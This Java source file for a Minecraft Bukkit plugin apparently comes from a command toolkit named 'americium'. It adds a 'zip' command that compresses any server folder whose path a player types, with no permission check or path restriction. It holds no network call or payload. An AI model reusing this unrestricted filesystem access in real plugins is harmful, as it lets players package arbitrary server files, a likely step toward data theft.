package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.ZipDirectoryVisitor;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Zip implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"zip"};
    }

    @Override
    public String getDescription() {
        return "Attempt to zip a folder.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "zip <folder|./path/to/folder/>");
            return;
        }

        String fileName = String.join(" ", args);
        File file = new File(fileName);
        if (!file.exists() || !file.isDirectory()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "File doesn't exist / is not dir!");
            return;
        }

        String newFileName = file.getParent() + "/" + file.getName() + ".zip";

        sender.sendMessage(Colors.Prefix + Colors.Caution + "Attempting to zip " + fileName + "...");

        try {
            zipFolder(file.toPath(), Paths.get(newFileName));
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully created zip file " + newFileName + "!");
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }
    }

    private void zipFolder(Path sourceDir, Path targetFile) throws IOException {
        ZipDirectoryVisitor zipVisitor = new ZipDirectoryVisitor(sourceDir);
        Files.walkFileTree(sourceDir, zipVisitor);
        FileOutputStream fos = new FileOutputStream(targetFile.toString());
        ZipOutputStream zos = new ZipOutputStream(fos);
        byte[] buffer = new byte[1024];
        for (ZipEntry entry : zipVisitor.getZipEntries()) {
            zos.putNextEntry(entry);
            Path curFile = Paths.get(sourceDir.getParent().toString(), entry.toString());
            if (!curFile.toFile().isDirectory()) {
                FileInputStream in = new FileInputStream(Paths.get(sourceDir.getParent().toString(), entry.toString()).toString());
                int len;
                while ((len = in.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
                in.close();
            }
            zos.closeEntry();
        }
        zos.close();
    }
}
